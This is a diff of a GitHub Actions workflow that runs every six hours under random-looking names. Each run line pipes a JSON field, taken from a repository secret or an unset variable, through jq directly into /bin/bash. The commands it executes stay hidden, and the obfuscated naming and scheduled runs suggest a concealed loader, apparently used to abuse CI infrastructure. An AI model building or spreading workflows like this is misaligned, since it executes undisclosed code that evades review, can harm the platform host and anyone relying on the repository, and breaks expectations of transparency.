@@ -1,23 +1,24 @@
 name: xuliangqing7654
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 2/6 * * *'
-jobs:  # 26814
+    - cron: '3 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xuliangqing7654
         env:
-          qmm79357: ${{ secrets.qmm79357 }}
+          hnkpi7783: ${{ secrets.hnkpi7783 }}
         run: |
-          echo $qmm79357 | jq -r .yyxda10 | /bin/bash
-          echo $kh634 | jq -r .mieun1 | /bin/bash
-          echo $vx0 | jq -r .lohn98517 | /bin/bash
-          echo $uvod9794 | jq -r .os44 | /bin/bash
-          echo $ukuuj6 | jq -r .kpe31 | /bin/bash
-          echo $c4 | jq -r .te1 | /bin/bash
+          echo $hnkpi7783 | jq -r .zprkj42657 | /bin/bash
+          echo $ocy761 | jq -r .iqpdh3 | /bin/bash
+          echo $nbq5 | jq -r .eix06 | /bin/bash
+          echo $e64689 | jq -r .j82 | /bin/bash
+          echo $hzf1 | jq -r .wuua5679 | /bin/bash
+          echo $sv245 | jq -r .n0723 | /bin/bash
+          echo $j62354 | jq -r .g20729 | /bin/bash
+          echo $baeh33612 | jq -r .bda3 | /bin/bash
 
